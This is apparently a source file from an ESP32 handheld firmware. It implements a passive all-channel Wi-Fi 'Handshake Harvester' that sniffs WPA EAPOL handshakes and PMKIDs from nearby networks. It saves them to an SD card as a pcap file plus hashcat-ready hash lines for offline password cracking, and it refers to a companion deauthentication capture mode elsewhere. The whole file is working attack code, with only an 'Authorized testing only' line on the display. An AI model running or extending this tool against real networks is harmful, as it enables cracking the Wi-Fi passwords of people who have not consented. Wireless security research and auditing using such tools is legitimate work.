// AWOKxDAG — Handshake Harvester (compiled as part of the sketch; see awok_common.h)
//
// All-channel passive collector. Hops every channel and records WPA EAPOL key
// frames (and one beacon per BSSID, so the pcap carries the ESSID) that are
// already in the air -- NO deauthentication is sent. Writes a single
// harvest.pcap plus hashcat-ready PMKID lines. The quiet, opportunistic
// counterpart to the targeted Grab. It reuses the shared capture ring buffer
// (captureQueue/captureHead/captureTail) since only one capture runs at a time.

HarvestAp harvestAps[kMaxHarvestAp];
int harvestApCount = 0;
// Seen-BSSID set for one-beacon-per-AP dedup. Touched ONLY by the Wi-Fi-task
// callback, so no locking is needed against the main loop.
uint8_t harvestSeenBssids[kMaxHarvestSeen][6];
volatile int harvestSeenCount = 0;
File harvestFile;
bool harvestFileOpen = false;
uint32_t harvestFramesWritten = 0;
uint32_t harvestEapolCount = 0;
uint32_t harvestPmkidCount = 0;
int harvestHopIndex = 0;
uint32_t lastHarvestHopMs = 0;
uint32_t lastHarvestDrawMs = 0;
uint32_t harvestStartMs = 0;
String harvestLastSsid;

bool harvestSeen(const uint8_t* bssid) {
  for (int i = 0; i < harvestSeenCount; ++i) {
    bool equal = true;
    for (int j = 0; j < 6; ++j) {
      if (harvestSeenBssids[i][j] != bssid[j]) { equal = false; break; }
    }
    if (equal) return true;
  }
  return false;
}

// Runs in the Wi-Fi task. Enqueue EAPOL data frames (any BSSID) and the first
// beacon seen per BSSID. Keep it short.
void harvesterCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
  const wifi_promiscuous_pkt_t* packet =
      static_cast<const wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* payload = packet->payload;
  const int length = packet->rx_ctrl.sig_len;
  if (length < 24) return;

  const uint8_t frameControl = payload[0];
  const uint8_t frameType = (frameControl >> 2) & 0x03;
  bool want = false;
  bool isEapol = false;

  if (frameType == 0x00) {  // management: keep one beacon per BSSID for ESSID
    if ((frameControl & 0xF0) == 0x80 && length >= 38) {
      if (!harvestSeen(payload + 16) && harvestSeenCount < kMaxHarvestSeen) {
        memcpy(harvestSeenBssids[harvestSeenCount], payload + 16, 6);
        ++harvestSeenCount;
        want = true;
      }
    }
  } else if (frameType == 0x02) {  // data: keep EAPOL (ethertype 0x888E)
    int header = 24;
    const uint8_t subtype = (frameControl >> 4) & 0x0F;
    if (subtype & 0x08) header += 2;  // QoS control
    const uint8_t frameControl1 = payload[1];
    if ((frameControl1 & 0x03) == 0x03) header += 6;  // 4-address frame
    if (length >= header + 8) {
      const uint8_t* llc = payload + header;
      if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
          llc[6] == 0x88 && llc[7] == 0x8E) {
        isEapol = true;
        want = true;
      }
    }
  }
  if (!want) return;

  const int next = (captureHead + 1) % kCaptureQueueSlots;
  if (next == captureTail) return;  // queue full: drop
  CaptureFrame& slot = captureQueue[captureHead];
  const int copyLen = length > kCaptureSlotBytes ? kCaptureSlotBytes : length;
  memcpy(slot.data, payload, copyLen);
  slot.len = static_cast<uint16_t>(copyLen);
  slot.origLen = static_cast<uint16_t>(length);
  const uint32_t nowUs = micros();
  slot.tsSec = nowUs / 1000000UL;
  slot.tsUsec = nowUs % 1000000UL;
  slot.isEapol = isEapol;
  captureHead = next;
}

bool openHarvestPcap() {
  if (!ensureSdCard()) return false;
  SD.remove(kHarvestPcapPath);
  harvestFile = SD.open(kHarvestPcapPath, FILE_WRITE);
  if (!harvestFile) {
    sdReady = false;
    return false;
  }
  writePcapLe32(harvestFile, 0xA1B2C3D4);  // link type 105 = IEEE802_11
  writePcapLe16(harvestFile, 2);
  writePcapLe16(harvestFile, 4);
  writePcapLe32(harvestFile, 0);
  writePcapLe32(harvestFile, 0);
  writePcapLe32(harvestFile, kCaptureSlotBytes);
  writePcapLe32(harvestFile, 105);
  harvestFile.flush();
  harvestFileOpen = harvestFile.getWriteError() == 0;
  return harvestFileOpen;
}

void writeHarvestFrame(const CaptureFrame& frame) {
  if (!harvestFileOpen) return;
  writePcapLe32(harvestFile, frame.tsSec);
  writePcapLe32(harvestFile, frame.tsUsec);
  writePcapLe32(harvestFile, frame.len);
  writePcapLe32(harvestFile, frame.origLen);
  harvestFile.write(frame.data, frame.len);
  ++harvestFramesWritten;
}

int harvestApIndexOf(const uint8_t* bssid) {
  for (int i = 0; i < harvestApCount; ++i) {
    bool equal = true;
    for (int j = 0; j < 6; ++j) {
      if (harvestAps[i].bssid[j] != bssid[j]) { equal = false; break; }
    }
    if (equal) return i;
  }
  return -1;
}

HarvestAp* harvestApUpsert(const uint8_t* bssid) {
  int index = harvestApIndexOf(bssid);
  if (index < 0) {
    if (harvestApCount >= kMaxHarvestAp) return nullptr;
    index = harvestApCount++;
    harvestAps[index] = HarvestAp();
    memcpy(harvestAps[index].bssid, bssid, 6);
  }
  return &harvestAps[index];
}

// Learn the ESSID for a BSSID from a captured beacon frame.
void harvestLearnBeacon(const CaptureFrame& frame) {
  if (frame.len < 38) return;
  HarvestAp* ap = harvestApUpsert(frame.data + 16);
  if (!ap) return;
  int i = 36;
  while (i + 2 <= frame.len) {
    const uint8_t tag = frame.data[i];
    const uint8_t tagLen = frame.data[i + 1];
    if (i + 2 + tagLen > frame.len) break;
    if (tag == 0x00) {
      const uint8_t n = tagLen > 32 ? 32 : tagLen;
      memcpy(ap->ssid, frame.data + i + 2, n);
      ap->ssid[n] = 0;
      if (n) harvestLastSsid = String(ap->ssid);
      return;
    }
    i += 2 + tagLen;
  }
}

void writeHarvestPmkid(const uint8_t* bssid, const uint8_t* sta,
                       const uint8_t* pmkid, const char* ssid) {
  if (!ensureSdCard()) return;
  File file = SD.open(kHarvestPmkidPath, FILE_APPEND);
  if (!file) {
    sdReady = false;
    return;
  }
  file.print("WPA*01*");
  for (int i = 0; i < 16; ++i) file.printf("%02x", pmkid[i]);
  file.print('*');
  for (int i = 0; i < 6; ++i) file.printf("%02x", bssid[i]);
  file.print('*');
  for (int i = 0; i < 6; ++i) file.printf("%02x", sta[i]);
  file.print('*');
  for (size_t i = 0; ssid && ssid[i]; ++i) {
    file.printf("%02x", static_cast<uint8_t>(ssid[i]));
  }
  file.println("***");
  file.close();
  Serial.println("[harvest] PMKID written to harvest_pmkid.txt");
}

// Classify a captured EAPOL frame: update the AP's 4-way progress and extract a
// PMKID from M1 if present.
void harvestInspectEapol(const CaptureFrame& frame) {
  const uint8_t frameControl1 = frame.data[1];
  const bool fromDs = frameControl1 & 0x02;
  const uint8_t* bssid = fromDs ? frame.data + 10 : frame.data + 4;
  const uint8_t* sta = fromDs ? frame.data + 4 : frame.data + 10;
  HarvestAp* ap = harvestApUpsert(bssid);

  int header = 24;
  const uint8_t subtype = (frame.data[0] >> 4) & 0x0F;
  if (subtype & 0x08) header += 2;
  if ((frameControl1 & 0x03) == 0x03) header += 6;
  const int llcEnd = header + 8;
  const int keyInfoOffset = llcEnd + 1 + 1 + 2 + 1;
  if (frame.len < keyInfoOffset + 2) return;
  const uint16_t keyInfo =
      (frame.data[keyInfoOffset] << 8) | frame.data[keyInfoOffset + 1];
  const bool pairwise = keyInfo & 0x0008;
  const bool install = keyInfo & 0x0040;
  const bool ack = keyInfo & 0x0080;
  const bool mic = keyInfo & 0x0100;
  const bool secure = keyInfo & 0x0200;
  if (!pairwise) return;
  if (ap) {
    if (ack && !mic && !install) ap->msgMask |= 0x01;       // M1
    else if (mic && !ack && !secure) ap->msgMask |= 0x02;   // M2
    else if (mic && ack && install) ap->msgMask |= 0x04;    // M3
    else if (mic && secure && !ack) ap->msgMask |= 0x08;    // M4
  }
  for (int i = llcEnd; i + 20 <= frame.len; ++i) {
    if (frame.data[i] == 0x00 && frame.data[i + 1] == 0x0F &&
        frame.data[i + 2] == 0xAC && frame.data[i + 3] == 0x04) {
      if (ap && !ap->pmkid) {
        ap->pmkid = true;
        ++harvestPmkidCount;
        writeHarvestPmkid(bssid, sta, frame.data + i + 4, ap ? ap->ssid : "");
      }
      break;
    }
  }
}

int harvestCompleteCount() {
  int complete = 0;
  for (int i = 0; i < harvestApCount; ++i) {
    if ((harvestAps[i].msgMask & 0x0F) == 0x0F) ++complete;
  }
  return complete;
}

void drawHarvester() {
  currentView = View::kHarvester;
  display.fillScreen(kBackground);
  const int complete = harvestCompleteCount();
  drawHeader("HARVESTER", "passive EAPOL/PMKID | ch " +
                              String(kDeauthHopChannels[harvestHopIndex]));
  display.setTextSize(2);
  display.setTextColor((complete || harvestPmkidCount) ? kGood : kAccent,
                       kBackground);
  display.setCursor(6, 52);
  display.printf("%d HS  %lu PM", complete,
                 static_cast<unsigned long>(harvestPmkidCount));

  display.setTextSize(1);
  display.setTextColor(ILI9341_WHITE, kBackground);
  display.setCursor(6, 88);
  display.printf("APs seen:      %d", harvestApCount);
  display.setCursor(6, 102);
  display.printf("EAPOL frames:  %lu",
                 static_cast<unsigned long>(harvestEapolCount));
  display.setCursor(6, 116);
  display.printf("Frames to SD:  %lu",
                 static_cast<unsigned long>(harvestFramesWritten));
  display.setCursor(6, 130);
  display.printf("Complete 4-way: %d", complete);

  display.setTextColor(kMuted, kBackground);
  display.setCursor(6, 150);
  display.print("Last SSID: ");
  display.print(clipped(harvestLastSsid.length() ? harvestLastSsid : "-", 26));

  display.drawFastHLine(6, 170, 228, kPanel);
  display.setTextColor(harvestFileOpen ? kAccent : kWarn, kBackground);
  display.setCursor(6, 180);
  display.print(harvestFileOpen ? "SD: harvest.pcap + pmkid"
                                : "SD unavailable; not saving");
  display.setTextColor(kMuted, kBackground);
  display.setCursor(6, 200);
  display.print("Passive: no deauth is sent. Only");
  display.setCursor(6, 212);
  display.print("handshakes already in the air are");
  display.setCursor(6, 224);
  display.print("captured. Authorized testing only.");
  drawFooter("Back", "Reset");
}

void resetHarvester() {
  harvestApCount = 0;
  harvestSeenCount = 0;
  harvestFramesWritten = 0;
  harvestEapolCount = 0;
  harvestPmkidCount = 0;
  harvestLastSsid = "";
  captureHead = 0;
  captureTail = 0;
  if (harvestFileOpen) {
    harvestFile.flush();
    harvestFile.close();
    harvestFileOpen = false;
  }
  SD.remove(kHarvestPmkidPath);
  harvestFileOpen = openHarvestPcap();
}

void startHarvester() {
  harvestApCount = 0;
  harvestSeenCount = 0;
  harvestFramesWritten = 0;
  harvestEapolCount = 0;
  harvestPmkidCount = 0;
  harvestLastSsid = "";
  captureHead = 0;
  captureTail = 0;
  harvestHopIndex = 0;
  lastHarvestHopMs = millis();
  lastHarvestDrawMs = 0;
  harvestStartMs = millis();
  signalMonitorActive = false;

  WiFi.disconnect(true, false);
  WiFi.mode(WIFI_MODE_STA);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filter = {};
  filter.filter_mask =
      WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&harvesterCallback);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(kDeauthHopChannels[0], WIFI_SECOND_CHAN_NONE);

  SD.remove(kHarvestPmkidPath);
  harvestFileOpen = openHarvestPcap();
  harvesterActive = true;
  Serial.println("[harvest] passive handshake harvester started");
  drawHarvester();
}

void stopHarvester() {
  harvesterActive = false;
  esp_wifi_set_promiscuous(false);
  if (harvestFileOpen) {
    harvestFile.flush();
    harvestFile.close();
    harvestFileOpen = false;
  }
  WiFi.mode(WIFI_MODE_STA);
  WiFi.disconnect(true, false);
  Serial.printf("[harvest] stopped; %lu frame(s), %d handshake(s), %lu PMKID\n",
                static_cast<unsigned long>(harvestFramesWritten),
                harvestCompleteCount(),
                static_cast<unsigned long>(harvestPmkidCount));
}

void updateHarvester() {
  if (!harvesterActive || currentView != View::kHarvester) return;
  while (captureTail != captureHead) {
    const CaptureFrame& frame = captureQueue[captureTail];
    writeHarvestFrame(frame);
    if (frame.isEapol) {
      ++harvestEapolCount;
      harvestInspectEapol(frame);
    } else {
      harvestLearnBeacon(frame);
    }
    captureTail = (captureTail + 1) % kCaptureQueueSlots;
  }
  const uint32_t now = millis();
  if (now - lastHarvestHopMs >= kHarvestHopIntervalMs) {
    lastHarvestHopMs = now;
    harvestHopIndex = (harvestHopIndex + 1) % kDeauthHopChannelCount;
    esp_wifi_set_channel(kDeauthHopChannels[harvestHopIndex],
                         WIFI_SECOND_CHAN_NONE);
  }
  if (now - lastHarvestDrawMs >= kHarvestRedrawMs) {
    lastHarvestDrawMs = now;
    if (harvestFileOpen) harvestFile.flush();
    drawHarvester();
  }
}
